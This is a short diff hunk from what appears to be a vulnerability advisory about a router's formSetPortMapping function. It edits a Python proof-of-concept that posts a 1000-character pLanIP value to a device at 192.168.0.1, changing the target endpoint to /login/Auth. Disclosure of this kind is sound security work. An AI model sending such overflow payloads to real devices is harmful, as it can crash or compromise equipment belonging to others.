@@ -19,7 +19,7 @@ In the function formSetPortMapping line 39, it reads in a user-provided paramete
 ```python
 import requests
 ip = '192.168.0.1'
-url = f'http://{ip}/goform/setPortMapping'
+url = f'http://{ip}/login/Auth'
 payload = {
     "pLanIP": 'a' * 1000
 }
